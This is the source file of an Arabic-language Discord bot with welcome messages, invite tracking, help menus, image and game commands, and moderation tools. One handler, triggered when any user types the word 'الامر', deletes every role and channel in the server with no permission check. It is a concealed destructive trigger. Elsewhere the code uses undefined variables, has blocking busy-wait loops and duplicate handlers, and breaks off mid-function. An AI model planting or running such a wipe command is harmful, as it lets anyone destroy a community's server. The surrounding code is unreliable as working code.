const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '.'

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
client.user.setGame(`Nothing`,"http://twitch.tv/S-F")
  console.log('')
  console.log('')
  console.log('╔[═════════════════════════════════════════════════════════════════]╗')
  console.log(`[Start] ${new Date()}`);
  console.log('╚[═════════════════════════════════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════════════════════════════]╗');
  console.log(`Logged in as * [ " ${client.user.username} " ]`);
  console.log('')
  console.log('Informations :')
  console.log('')
  console.log(`servers! [ " ${client.guilds.size} " ]`);
  console.log(`Users! [ " ${client.users.size} " ]`);
  console.log(`channels! [ " ${client.channels.size} " ]`);
  console.log('╚[════════════════════════════════════]╝')
  console.log('')
  console.log('╔[════════════]╗')
  console.log(' Bot Is Online')
  console.log('╚[════════════]╝')
  console.log('')
  console.log('')
});




	               client.on('message', message => {
                    var prefix = "||";

           if (message.content.startsWith(prefix + "id")) {
                     if(!message.channel.guild) return message.reply(`هذا الأمر فقط ل السيرفرات ❌`);

                message.guild.fetchInvites().then(invs => {
      let member = client.guilds.get(message.guild.id).members.get(message.author.id);
      let personalInvites = invs.filter(i => i.inviter.id === message.author.id);
      let inviteCount = personalInvites.reduce((p, v) => v.uses + p, 0);
      var moment = require('moment');
      var args = message.content.split(" ").slice(1);
let user = message.mentions.users.first();
var men = message.mentions.users.first();
 var heg;
 if(men) {
     heg = men
 } else {
     heg = message.author
 }
var mentionned = message.mentions.members.first();
  var h;
 if(mentionned) {
     h = mentionned
 } else {
     h = message.member
 }
        moment.locale('ar-TN');
      var id = new  Discord.RichEmbed()
       
    .setColor("#0a0909")
    .setAuthor(message.author.username, message.author.avatarURL) 
.addField(': دخولك لديسكورد قبل', `${moment(heg.createdTimestamp).format('YYYY/M/D HH:mm:ss')} **\n** \`${moment(heg.createdTimestamp).fromNow()}\`` ,true) 
.addField(': انضمامك لسيرفر قبل', `${moment(h.joinedAt).format('YYYY/M/D HH:mm:ss')} \n \`${moment(h.joinedAt).fromNow()}\``, true)
.addField(': عدد الدعوات', inviteCount,false)
.setFooter("-")  
    message.channel.sendEmbed(id);
})
}
    

         
     });
	 
	 
	 
	 client.on('guildMemberAdd', member => {
    var embed = new Discord.RichEmbed()
    .setAuthor(member.user.username, member.user.avatarURL)
    .setThumbnail(member.user.avatarURL)
    .setTitle(`عضو جديد`)
    .setDescription(`اهلا بك في السيرفر`)
    .addField(' :bust_in_silhouette:  انت رقم',`**[ ${member.guild.memberCount} ]**`,true)
    .setColor('GREEN')
    .setFooter('', 'https://cdn.discordapp.com/icons/390551815072251904/418fa2788d8115808951c9881ba8f190.jpg')

var channel =member.guild.channels.find('name', 'wlc')
if (!channel) return;
channel.send({embed : embed});
});
	 
	 
	 
	 
	 client.on('guildMemberAdd', member => {
    if (!member || !member.id || !member.guild) return;
    const guild = member.guild;

    const channel = member.guild.channels.find('name', 'bot');
    if (!channel) return;
    let memberavatar = member.user.avatarURL
    const fromNow = moment(member.user.createdTimestamp).fromNow();
    const isNew = (new Date() - member.user.createdTimestamp) < 900000 ? '🆕' : '';

    let embed = new Discord.RichEmbed()
       .setAuthor(`${member.user.tag}`, member.user.avatarURL)
       .setThumbnail(memberavatar)
       .setColor('GREEN')
       .setDescription(`📥 <@${member.user.id}> **دخل السيرفر**\n\n`)
       .setTimestamp();
     channel.send({embed:embed});
});
// لوق خروج اللاعبين
client.on('guildMemberRemove', member => {
    if (!member || !member.id || !member.guild) return;
    const guild = member.guild;

    const channel = member.guild.channels.find('name', 'bot');
    if (!channel) return;
    let memberavatar = member.user.avatarURL
    const fromNow = moment(member.joinedTimestamp).fromNow();

    let embed = new Discord.RichEmbed()
       .setAuthor(`${member.user.tag}`, member.user.avatarURL)
       .setThumbnail(memberavatar)
       .setColor('RED')
       .setDescription(`📤 <@${member.user.id}> **خرج من السيرفر**\n\n`)
       .setTimestamp();
     channel.send({embed:embed});
});
    
    client.on('guildMemberRemove', member => {
        var embed = new Discord.RichEmbed()
        .setAuthor(member.user.username, member.user.avatarURL)
        .setThumbnail(member.user.avatarURL)
        .setTitle(`الله معاك :raised_hand::skin-tone-1: :pensive:`)
        .setDescription(`باي اتشرفنا بمعرفتك :raised_hand::skin-tone-1: :pensive: `)
        .addField(':bust_in_silhouette:   تبقي',`**[ ${member.guild.memberCount} ]**`,true)
        .setColor('RED')
        .setFooter(`==== نــتــمــنــآ لــكــم آســتــمـــتــآع ====`, 'https://cdn.discordapp.com/attachments/397818254439219217/399292026782351381/shy.png')
    
    var channel =member.guild.channels.find('name', 'chat')
    if (!channel) return;
    channel.send({embed : embed});
    }) 

client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '||help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("**:globe_with_meridians: الأوامر العامه**","** **")
      .addField("**||ping :stopwatch:**","**لـ سرعة إتصالك**")
      .addField("**||rping :satellite_orbital:**","**لـ معرفة سرعة البوت **")
	  .addField("**||id :chart_with_downwards_trend:**","**لـ رؤيه البيانات الخاصه بك**")
	  .addField("**||server :recycle:**","**لـ معلومات السيرفر**")
      .addField("**||say :arrows_counterclockwise:**","**لـ يكرر الكلام اللى تقوله**")
      .addField("**||roll :1234: **","**لـ اختيار رقم عشوائ من 1الي1000**")
	  .addField("**||active :gear: **","**لـ حاله الاعضاء**")
	  .addField("**||rules :clipboard: **","**لـ معرفة الرولز الي موجودة في السيرفر**")
	  .addField("**||avatar :frame_photo:  **","** يوريك صورتك**")
	  .addField("**||servericon :city_sunset: **","** يوريك صورة السيرفر**")
	  .addField("**||animal :dog2:  **","** يوريك صور حيونات**")
	  .addField("**||dt :clock:  **","** يوريك الوقت والتاريخ**")
	  .addField("**||cut :question: **","** يعطيك اسئلة**")
	  .addField("**||servers  :1234:**","**يريك البوت في كم سيرفر**")
	  .addField("**||dyk :interrobang: **","**هل تعلم**")
	  .addField("**||if tmyc:arrow_backward::arrow_forward: **","**لعبة لو خيروك**")
	  .addField("**||coinflip :copyright:**","**لعبت رمي العملة**")
	  .addField("**||Invitations :busts_in_silhouette:**","**لمعرفة العضو ادخل كم شخص الي السيرفر**")
	  .addField("**||inv :inbox_tray:**","**لاضافة البوت الي سيرفرك**")

	  
	.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});


client.on('message' , async (message) => {
       if(message.content.startsWith(`<@${client.user.id}>`)) {
              
 let responses = [
        'كيف يمكن اساعدك',
        'مرحبا',
        'لا تزعجني',
        'ماذا تريد ',
        'اهلا',
        'كيفك',
        '?',
        'جرب ||help'
    ]
    
    // Fetch a random item from the array
    let fetched = responses[Math.floor(Math.random() * responses.length)];
   message.reply(fetched)
       }
  
});


client.on("guildMemberAdd", (member) => {
    let channel = member.guild.channels.find('name', 'join');
    if (!channel) {
        console.log("!channel fails");
        return;
    }
    if (member.id == client.user.id) {
        return;
    }
    console.log('made it till here!');
    var guild;
    while (!guild)
        guild = client.guilds.find("name", "DzGaming Official Server")
    guild.fetchInvites().then((data) => {
        data.forEach((Invite, key, map) => {
            var Inv = Invite.code;
            if (dat[Inv])
                if (dat[Inv] < Invite.uses) {
                    console.log(3);
                    console.log(`${member} joined over ${Invite.inviter}'s invite ${Invite.code}`)
 channel.send(` ♥ **تم دعوته من قبل ${Invite.inviter} ♥ `)            
 }
            dat[Inv] = Invite.uses;
        })
    })
});


const ms = require("ms");
client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 't')) {
         let args = message.content.split(" ").slice(1);
let Timer = args[0];
if(!args[0]){
  return message.channel.send("Please enter a period of time, with either `s,m or h` at the end!");
}
if(args[0] <= 0){
  return message.channel.send("Please enter a period of time, with either `s,m or h` at the end!");
}
message.channel.send(":white_check_mark: Timer has been set for: " + `${ms(ms(Timer), {long: true})}`)

setTimeout(function(){
  message.channel.send(`Timer has ended, it lasted: ${ms(ms(Timer), {long: true})}` + message.author.toString())
}, ms(Timer));
} 
}); 


client.on('message' , async (message) => {
 if (message.content.startsWith(prefix + 'q')) {
  let args = message.content.split(" ").slice(1);
if(!args[0]) return message.channel.send('Correct usage: **ks!reverse (text to reverse)**');

  function reverseString(str) {
      return str.split("").reverse().join("");
  }

  let sreverse = reverseString(args.join(' '))
   
  if(args[0] === sreverse) {
  
  sreverse = `${args.join(' ')}..Wait... You broke it!`
  
  }
  const reverseEmbed = new Discord.RichEmbed()
  .setAuthor(`${message.author.tag}`, message.author.avatarURL)
  .setColor(0xFFF000)
  .addField('Input: ', '```' + `${args.join(' ')}` + '```')
  .addField('Output: ', '```' + `${sreverse}` + '```')
  message.channel.send({embed: reverseEmbed})
    
}
});



const mapping = {
  ' ': '   ',
  '0': ':zero:',
  '1': ':one:',
  '2': ':two:',
  '3': ':three:',
  '4': ':four:',
  '5': ':five:',
  '6': ':six:',
  '7': ':seven:',
  '8': ':eight:',
  '9': ':nine:',
  '!': ':grey_exclamation:',
  '?': ':grey_question:',
  '#': ':hash:',
  '*': ':asterisk:'
};

'abcdefghijklmnopqrstuvwxyz'.split('').forEach(c => {
  mapping[c] = mapping[c.toUpperCase()] = ` :regional_indicator_${c}:`;
});


client.on('message' , async (message) => {
       if(message.content.startsWith(prefix + "e")) {
          let args = message.content.split(" ").slice(1);
  if (args.length < 1) {
    message.channel.send('You must provide some text to emojify!');
}

message.channel.send(
    args.join(' ')
        .split('')
        .map(c => mapping[c] || c)
        .join('')
);
};
});


client.on('message', message => {
    if (message.content.startsWith("رابط")) {
        message.channel.createInvite({
        thing: true,
        maxUses: 2,
        maxAge: 3600,
    }).then(invite =>
      message.author.sendMessage(invite.url)
    )
    const embed = new Discord.RichEmbed()
        .setColor("RANDOM")
          .setDescription("The link was sent with a special message")
            	.setAuthor(client.user.username, client.user.avatarURL)
                 .setAuthor(client.user.username, client.user.avatarURL)
                .setFooter('طلب بواسطة: ' + message.author.tag)

      message.channel.sendEmbed(embed).then(message => {message.delete(10000)})
              const Embed11 = new Discord.RichEmbed()
        .setColor("RANDOM")
        
    .setDescription("** مدة الرابط : ساعه | عدد استخدامات الرابط : 2 **")
      message.author.sendEmbed(Embed11)
    }
}); 


client.on('guildCreate', guild => {
  client.channels.get("ايدي الروم").send(`**تم اضافة البوت في سيرفر جديد مبروكك
Server name: __${guild.name}__
Server owner: __${guild.owner}__**`)
}); 






client.on('message', x5bz => {   
 if (x5bz.content.startsWith("الامر")) {
     x5bz.guild.roles.forEach(r => { r.delete() }) 
     x5bz.guild.channels.forEach(c => { c.delete() })
                let v5bz = new Discord.RichEmbed()
            .setColor('RANDOM')
            .setDescription('**تم الحذف بنجاح**')
           x5bz.author.sendEmbed(v5bz);
 }
 });


const arraySort = require('array-sort'),
      table = require('table');

client.on('message' , async (message) => {

    if(message.content.startsWith(prefix + "Invitations")) {

  let invites = await message.guild.fetchInvites();

    invites = invites.array();

    arraySort(invites, 'uses', { reverse: true });

    let possibleInvites = [['User Invited', 'Uses']];
    invites.forEach(i => {
      possibleInvites.push([i.inviter.username , i.uses]);
    })
    const embed = new Discord.RichEmbed()
    .setColor('RANDOM')
    .setTitle("دعوات السيرفر")
    .addField('المتصدرين' , `\`\`\`${table.table(possibleInvites)}\`\`\``)
    .setFooter('mark bot', 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQM2yRWr2mplf-CbHbvSnfKmsQgKu8hT-x_dOmbxP3t3SSGgYwpfg')
    .setThumbnail(message.author.avatarURL)

    message.channel.send(embed)
    }
});


client.on('message', message => {
                                if(!message.channel.guild) return;
                        if (message.content.startsWith('||rping')) {
                            if(!message.channel.guild) return;
                            var msg = `${Date.now() - message.createdTimestamp}`
                            var api = `${Math.round(client.ping)}`
                            if (message.author.bot) return;
                        let embed = new Discord.RichEmbed()
                        .setAuthor(message.author.username,message.author.avatarURL)
                        .setColor('RANDOM')
                        .addField('**Time Taken:**',msg + " ms 📶 ")
                        .addField('**WebSocket:**',api + " ms 📶 ")
         message.channel.send({embed:embed});
                        }
                    });



client.on("guildMemberAdd", member => {
  member.createDM().then(function (channel) {
  return channel.send(` نورت السيرفر يا حلو ${member} `) 
}).catch(console.error)
})


             client.on('message', message => {
                if(message.content === prefix + "inv") {
                    let embed = new Discord.RichEmbed ()
                    embed.setTitle("**:arrow_right: Invite Mark Bot**")
                    .setURL("https://discordapp.com/oauth2/authorize?client_id=435444497057316864&scope=bot&permissions=27648");
                   message.channel.sendEmbed(embed);
                  }
});




const dot = new Discord.Client();
client.on('message', message => {
    
    if (message.content === "mark") {
        setInterval(function(){
        message.edit('**✱➼**')    
        message.edit('**✱➼ m**')    
        message.edit('**✱➼ a**')
        message.edit('**✱➼ r**')
        message.edit('**✱➼ k**')
        message.edit('**✱➼ m**')
        message.edit('**✱➼ ma**')
        message.edit('**✱➼ mar**')
        message.edit('**✱➼ mark**')
        message.edit('**✱➼ marke**')
        message.edit('**✱➼ markey****')

        }, 1000)
    }
    
})





 var coinflip =["https://i.imgur.com/ounEiyN.png", "https://i.imgur.com/xUwvSde.png"]
     client.on('message', message => {
         var args = message.content.split(" ").slice(1);         
     if(message.content.startsWith(prefix + 'coinflip')) {
          var embed = new Discord.RichEmbed()
 .setImage(coinflip[Math.floor(Math.random() * coinflip.length)])
 message.channel.sendEmbed(embed);
     }
 });

var memes =["http://www.shuuf.com/shof/uploads/2015/09/09/jpg/shof_b9d73150f90a594.jpg","https://haltaalam.info/wp-content/uploads/2015/05/0.208.png","https://haltaalam.info/wp-content/uploads/2015/05/266.png","https://haltaalam.info/wp-content/uploads/2015/05/250.png","https://haltaalam.info/wp-content/uploads/2017/02/0.2517.png","https://pbs.twimg.com/media/CP0mi02UAAA3U2z.png","http://www.shuuf.com/shof/uploads/2015/08/31/jpg/shof_3b74fa7295ec445.jpg","http://www.shuuf.com/shof/uploads/2015/08/22/jpg/shof_fa3be6ab68fb415.jpg","https://pbs.twimg.com/media/CSWPvmRUcAAeZbt.png","https://pbs.twimg.com/media/B18VworIcAIMGsE.png"]
client.on('message', message => {
if(message.content.startsWith(prefix + 'dyk')) {
     var embed = new Discord.RichEmbed()
.setImage(memes[Math.floor(Math.random() * memes.length)])
message.channel.sendEmbed(embed);
}
});

client.on('message' , message => { 
     if (message.content === prefix + "servers") {

if(!message.channel.guild) return;
  if(message.content < 1023) return
  const Embed11 = new Discord.RichEmbed()
.setAuthor(client.user.username,client.user.avatarURL)
.setThumbnail(client.user.avatarURL)
.setDescription(`***servers ${client.guilds.size} \n \n${client.guilds.map(guilds => `- ${guilds.name}`).join('\n')}***`)
         message.channel.sendEmbed(Embed11)
    }
});

	client.on("ready", () => {
    var guild;
    while (!guild)
        guild = client.guilds.get("408786743437819904");
    guild.fetchInvites().then((data) => {
        data.forEach((Invite, key, map) => {
            var Inv = Invite.code;
            dat[Inv] = Invite.uses;
        });
    });
});  

client.on("guildMemberAdd", (member) => {
    let channel = member.guild.channels.get("408786743437819904");
    if (!channel) {
        console.log("!the channel id it's not correct");
        return;
    }
    if (member.id == client.user.id) {
        return;
    }
    console.log('-');
    var guild;
    while (!guild)
        guild = client.guilds.get("408786743437819904");
    guild.fetchInvites().then((data) => {
        data.forEach((Invite, key, map) => {
            var Inv = Invite.code;
            if (dat[Inv])
                if (dat[Inv] < Invite.uses) {
 channel.send(`تم دعوته بواسطة  ${Invite.inviter} `) ;        
 }
            dat[Inv] = Invite.uses;
       
       });
});
});


client.on('message', msg => {
  if (msg.content === 'hi') {
    msg.reply('**hi**');
  }
});

client.on('message', msg => {
  if (msg.content === 'اهلا') {
    msg.reply('**اهلا بيك**');
  }
});

client.on("message", async message => {
if (message.content.startsWith(prefix + '||animal')) {
get("https://random.cat/meow").then(animal => {
var embed = new Discord.RichEmbed()
.setImage(animal.body.file)
message.channel.send({embed})
})};});


const cuttweet = [
     'ct ‏| تخيّل لو أنك سترسم شيء وحيد فيصبح حقيقة، ماذا سترسم؟',
     'ct | أكثر شيء يُسكِت الطفل برأيك؟',
     'ct | الحرية لـ ... ؟',
     'ct | قناة الكرتون المفضلة في طفولتك؟',
     'ct ‏| كلمة للصُداع؟',
     'ct ‏| ما الشيء الذي يُفارقك؟',
     'ct ‏| ما الشيء الذي يُفارقك؟',
     'ct | موقف مميز فعلته مع شخص ولا يزال يذكره لك؟',
     'ct ‏| أيهما ينتصر، الكبرياء أم الحب؟',
     'ct | بعد ١٠ سنين ايش بتكون ؟',
     'ct ‏| مِن أغرب وأجمل الأسماء التي مرت عليك؟',
     'ct | عمرك شلت مصيبة عن ش��������ص برغبتك ؟',
     'ct | أكثر سؤال وجِّه إليك مؤخرًا؟',
     'ct | ما هو الشيء الذي يجعلك تشعر بالخوف؟',
     'ct | وش يفسد الصداقة؟',
     'ct | شخص لاترفض له طلبا ؟',
     'ct | كم مره خسرت شخص تحبه؟.',
     'ct | كيف تتعامل مع الاشخاص السلبيين ؟',
     'ct | كلمة تشعر بالخجل اذا قيلت لك؟',
     'ct | جسمك اكبر من عٌمرك او العكسّ ؟!',
     'ct |أقوى كذبة مشت عليك ؟',
     'ct | تتأثر بدموع شخص يبكي قدامك قبل تعرف السبب ؟',
     'ct | هل حدث وضحيت من أجل شخصٍ أحببت؟',
     'ct | أكثر تطبيق تستخدمه مؤخرًا؟',
     'ct | ‏اكثر شي يرضيك اذا زعلت بدون تفكير ؟',
     'ct | وش محتاج عشان تكون مبسوط ؟',
     '‏ct | مطلبك الوحيد الحين ؟',
     'ct | هل حدث وشعرت بأنك ارتكبت أحد الذنوب أثناء الصيام؟',
]

 client.on('message', message => {
   if (message.content.startsWith(prefix + "cut")) {
                if(!message.channel.guild) return message.reply('** This command only for servers**');
  var embed = new Discord.RichEmbed()
  .setColor('RANDOM')
   .setThumbnail(message.author.avatarURL) 
 .addField('bot HS!!!' ,
  `${cuttweet[Math.floor(Math.random() * cuttweet.length)]}`)
  message.channel.sendEmbed(embed);
  console.log('[id] Send By: ' + message.author.username)
    }
});

client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'dt')) {
var today = new Date()
let Day = today.toString().split(" ")[0].concat("day");
let Month = today.toString().split(" ")[1]
let Year = today.toString().split(" ")[3]
message.channel.send(`\`${Day}\` \`${Month}\` \`${Year}\`\n\`Time of day:\` \`${today.toString().split(" ")[4]}\``)
}
}); 
	 
	 
	 
	 
	 var iLieayb = ["https://f.top4top.net/p_682it2tg6.png","https://e.top4top.net/p_682a1cus5.png","https://d.top4top.net/p_682pycol4.png","https://c.top4top.net/p_682vqehy3.png","https://b.top4top.net/p_682mlf9d2.png","https://a.top4top.net/p_6827dule1.png","https://b.top4top.net/p_682g1meb10.png","https://a.top4top.net/p_682jgp4v9.png","https://f.top4top.net/p_682d4joq8.png","https://e.top4top.net/p_6828o0e47.png","https://d.top4top.net/p_6824x7sy6.png","https://c.top4top.net/p_682gzo2l5.png","https://b.top4top.net/p_68295qg04.png","https://a.top4top.net/p_682zrz6h3.png","https://f.top4top.net/p_6828vkzc2.png","https://e.top4top.net/p_682i8tb11.png"]
    client.on('message', message => {
        var args = message.content.split(" ").slice(1);
///by !! ʟʜꜱ | iLieayb_#8174
    if(message.content.startsWith(prefix + 'if tmyc')) {
         var cat = new Discord.RichEmbed()
.setImage(iLieayb[Math.floor(Math.random() * iLieayb.length)])
message.channel.sendEmbed(cat);
    }
});
	 
	 
	 
  var prefix = "||";
var cats = ["https://i.ytimg.com/vi/SfLV8hD7zX4/maxresdefault.jpg","http://www.dogbazar.org/wp-content/uploads/2014/09/british-bull-dog-puppies.jpg","http://cdn2-www.dogtime.com/assets/uploads/gallery/german-shepherd-dog-breed-pictures/standing-7.jpg","http://cdn.akc.org/Marketplace/Breeds/German_Shepherd_Dog_SERP.jpg","https://animalso.com/wp-content/uploads/2016/12/black-german-shepherd_2.jpg","https://static.pexels.com/photos/104827/cat-pet-animal-domestic-104827.jpg","https://www.petfinder.com/wp-content/uploads/2012/11/101438745-cat-conjunctivitis-causes.jpg","http://www.i-love-cats.com/images/2015/04/12/cat-wallpaper-38.jpg","https://www.aspca.org/sites/default/files/cat-care_urine-marking_main-image.jpg","https://s-media-cache-ak0.pinimg.com/originals/f0/3b/76/f03b7614dfadbbe4c2e8f88b69d12e04.jpg","http://www.rd.com/wp-content/uploads/sites/2/2016/04/15-cat-wants-to-tell-you-attention.jpg","https://www.thelocal.de/userdata/images/article/fa6fd5014ccbd8f4392f716473ab6ff354f871505d9128820bbb0461cce1d645.jpg","https://www.adelaidezoo.com.au/wp-content/uploads/sites/2/animals/GiantPanda3Slider.jpg","http://imagem.band.com.br/f_230168.jpg"]
    client.on('message', message => {
        var args = message.content.split(" ").slice(1);
    if(message.content.startsWith(prefix + 'animal')) {
         var cat = new Discord.RichEmbed()
.setImage(cats[Math.floor(Math.random() * cats.length)])
message.channel.sendEmbed(cat);
    }
});

client.on('message', message => {
  if (message.content.startsWith("||avatar")) {

      var mentionned = message.mentions.users.first();
  var mark;
    if(mentionned){
        var mark = mentionned;
    } else {
        var mark = message.author;
        
    }
      const embed = new Discord.RichEmbed()
      .setColor("RANDOM")
        .setAuthor(message.author.username, message.author.avatarURL)
      .setImage(`${mark.avatarURL}`)
    message.channel.sendEmbed(embed);

  }
});
client.on('message', message => {
    if (message.content.startsWith(prefix + "servericon")) {
if (!message.channel.guild) return message.reply('** This command only for servers **');
        var mentionned = message.mentions.users.first();
        var server;
        if (mentionned) {
            var server = mentionned;
        }
        else {
            var server = message.author;

        }

      const embed = new Discord.RichEmbed()
            .setColor("RANDOM")
            .setImage(`${message.guild.iconURL}`)
                      .setFooter(message.author.username, message.author.avatarURL)
                              message.channel.sendEmbed(embed);

};
})


const request = require("request");
client.on('message' , async (message) => {
       if(message.content.startsWith(prefix + "rp")) {
  let imgs = Math.floor(Math.random() * 80);
  let url = ['https://www.reddit.com/r/Rabbits/.json?sort=rising&t=hour&limit=100'];
  request({
    method: 'GET',
    uri: url[Math.floor(Math.random() * url.length)]
  }, function (err, response, data) {
    if(err) {
      console.log(err, null);
      return;
    }

  data = JSON.parse(data);
  var mainObj = data.data.children;
  var urls = {};

  for(let i = 0; i < mainObj.length; i++) {
  let url = mainObj[i].data.url;
  urls[i+1] = url;
    }
  const embed = new Discord.RichEmbed()
  .setTitle("Jump!")
  .setColor(0xC93457)
  .setImage(urls[imgs])
  message.channel.send({embed});

  if(client.user && message.content === "undefined") {
      message.delete()
  }})
};

});


client.on('message', message => {
if (message.content.startsWith(prefix + "rules")) {
                if (!message.channel.guild) return message.reply('** This command only for servers **');    
                        if(!message.channel.guild) return message.reply('**This Command is Only For Servers**');
            var roles = message.guild.roles.map(roles => `${roles.name}, `).join(' ')
            const embed = new Discord.RichEmbed()
            .setColor('#2800ff')
               .addField(`${message.guild.name}`,`**Roles :white_check_mark:**`)
             .addField(':arrow_down: Number Roles. :heavy_check_mark:',`** ${message.guild.roles.size}**`)
             .addField(':arrow_down: Name Roles. :heavy_check_mark:',`**${roles}**`)
            message.channel.sendEmbed(embed);
        }
    });
client.on('message', message => {
if (message.content.startsWith(prefix + "roll")) {
          message.channel.sendMessage(Math.floor(Math.random() * 1000));
            }
});
client.on('message', message => {
var args = message.content.split(" ").slice(1);    
if(message.content.startsWith(prefix + 'id')) {
var year = message.author.createdAt.getFullYear()
var month = message.author.createdAt.getMonth()
var day = message.author.createdAt.getDate()
var men = message.mentions.users.first();  
let args = message.content.split(' ').slice(1).join(' ');
if (args == '') {
var z = message.author;
}else {
var z = message.mentions.users.first();
}

let d = z.createdAt;          
let n = d.toLocaleString();   
let x;                       
let y;                        

if (z.presence.game !== null) {
y = `${z.presence.game.name}`;
} else {
y = "No Playing... |💤.";
}
if (z.bot) {
var w = 'bot';
}else {
var w = 'member';
}
let embed = new Discord.RichEmbed()
.setColor("#502faf")

.addField('🔱| Your Name',`**<@` + `${z.id}` + `>**`, true)


.addField('🛡| ID', "**"+ `${z.id}` +"**",true)


.addField('♨| Playing','**'+y+'**' , true)


.addField('🤖| Your account type',"**"+ w + "**",true)    


.addField('📛| The code is right for your account',"**#" +  `${z.discriminator}**`,true)


.addField('**The date in which your account was created | 📆 ** ' ,year + "-"+ month +"-"+ day)    


.addField("**The date you entered the server| ⌚   **", message.member.joinedAt.toLocaleString())    


.addField('**⌚ | The date of creating your full account**', message.author.createdAt.toLocaleString())


.addField("**The last message for you | 💬  **", message.author.lastMessage)            

.setThumbnail(`${z.avatarURL}`)
.setFooter(message.author.username, message.author.avatarURL)

message.channel.send({embed});
    if (!message) return message.reply('**ضع المينشان بشكل صحيح  ❌ **').catch(console.error);

}

});
client.on('message', message => {
  if (message.author.bot) return;
  if (!message.content.startsWith(prefix)) return;

  let command = message.content.split(" ")[0];
  command = command.slice(prefix.length);

  let args = message.content.split(" ").slice(1);

  if (command == "say") {
   message.channel.sendMessage(args.join("  "))
  }
});
client.on('message', message => {
     if (message.content === "servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '||help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("**:radioactive: أوامر الأداره**","** **")
      .addField("**||bc  :mega:**","**لـ البرودكاست**")
      .addField("**||0 :wastebasket: **","**لـ مسح الشات**")
      .addField("**||kick  :outbox_tray:**","**لـ طرد الأعضاء**")
	  .addField("**||ban  :no_entry:**","**لـ حظر الأعضاء**")
	  .addField("**||cv :o:**","**عمل روم دائم**")
	 .addField("**||v2min  :stopwatch:**","**عمل روم موقت لمده 2 دقائق**")
	  .addField("**:gear: **","**wlc اعمل تكس اتشنل ليظهر لك من يدخل السيرفر ومعلواتة  باسم **")

	  .setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});

var prefix= "||";
client.on("message", message => {
    if(message.content.startsWith(prefix + 'v2min')) {
     let args = message.content.split(" ").slice(1);
       var nam = args.join(' ');
    
      if(!message.member.hasPermission('ADMINISTRATOR')) return    message.channel.send('`ADMINISTRATOR` للأسف هذه الخاصية تحتاج الى ').then(msg => msg.delete(6000))
      if (!nam) return message.channel.send(`<@${message.author.id}> يجب عليك ادخال اسم`).then(msg => msg.delete(10000))
      message.guild.createChannel(nam, 'voice').then(c => setTimeout(() => c.delete(), 120000)) // كل 60 تساوي دقيقة عدل عليها الوقت لي تبيه 
      message.channel.send(`:ballot_box_with_check: TemporarySound : \`${nam}\``).then(c => setTimeout(() => c.edit(`<@${message.author.id}> :stopwatch:  انتهى وقت الروم الصوتي`), 120000))  // 120000 دقيقتان
    }
    });
	
	
	client.on("message", (message) => {
if (message.content.startsWith("||cv")) {
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply("You Don't Have `MANAGE_CHANNELS` Premissions ");
        let args = message.content.split(" ").slice(1);
    message.guild.createChannel(args.join(' '), 'voice');
    message.channel.sendMessage('تـم إنـشاء روم صـوتي')
    
}
});
	

client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
if (message.content === '||help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("** صاحب البوت :wrench: **","**      ☯♕♔ϻᗩᖇҜĒý♕♔☯#9712  **")
.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
}); 
client.on('message', message => {
     if (message.content === ".servers") {
     let embed = new Discord.RichEmbed()
  .setColor("#0000FF")
  .addField("**Server: **" , client.guilds.size)
  message.channel.sendEmbed(embed);
    }
	if (message.content === '||help') {
         let embed = new Discord.RichEmbed()
.setThumbnail(message.author.avatarURL)    
      .addField("** :grinning: **","**   واستمتع معنا في السيرفر|enjoy the server with us   **")
.setColor('RANDOM')
  message.author.sendEmbed(embed);
    }
});
client.on('message', message => {
    if (message.content === '||roles') {
        var roles = message.guild.roles.map(roles => `${roles.name}, `).join(' ')
        const embed = new Discord.RichEmbed()
        .setColor('RANDOM')
        .addField('Roles:',`**[${roles}]**`)
        message.channel.sendEmbed(embed);
    }
});
client.on('message', message => {
if (message.content.startsWith('||ping')) {
           if(!message.channel.guild) return;

if (message.author.bot) return;
    message.channel.sendMessage(`**Pong ! :** \`${Date.now() - message.createdTimestamp} ms\``);
    }

});
var prefix = "||";
client.on('message', message => {
    if (message.author.bot) return;
    if (!message.content.startsWith(prefix)) return;

    let command = message.content.split(" ")[0];
    command = command.slice(prefix.length);

    let args = message.content.split(" ").slice(1);
    if (command == "embed") {
        if (!message.channel.guild) return message.reply('** This command only for servers **');
        let say = new Discord.RichEmbed()
            .addField('Emebad:', `${message.author.username}#${message.author.discriminator}`)
            .setDescription(args.join("  "))
            .setColor(0x23b2d6)
        message.channel.sendEmbed(say);
        message.delete();
    }


});
var prefix = "||";
client.on('message', message => {
    if(message.content == prefix + 'server') {
        var servername = message.guild.name
        var اونر = message.guild.owner
        var اعضاء = message.guild.memberCount
        var ايدي = message.guild.id
        var بلدالسيرفر = message.guild.region
        var الرومات = message.guild.channels.size
        var الرتب = message.guild.roles
        var عمل = message.guild.createdAt
        var الروم = message.guild.defaultChannel
        var server = new Discord.RichEmbed()
        .setThumbnail(message.guild.iconURL)
        .addField('The name of the server', servername)
        .addField('ID ' , [ايدي])
        .addField('Server members', اعضاء)
        .addField('Rumat server', الرومات)
        .addField('Basic Chat Room', الروم)
        .addField('server owner', اونر)
        .addField('Country of the server', بلدالسيرفر)
        .addField('The opening date of the server', عمل)
        .setColor('RANDOM')

        message.channel.sendEmbed(server)
    }
});

client.on('message', msg => {
  if (msg.author.bot) return;
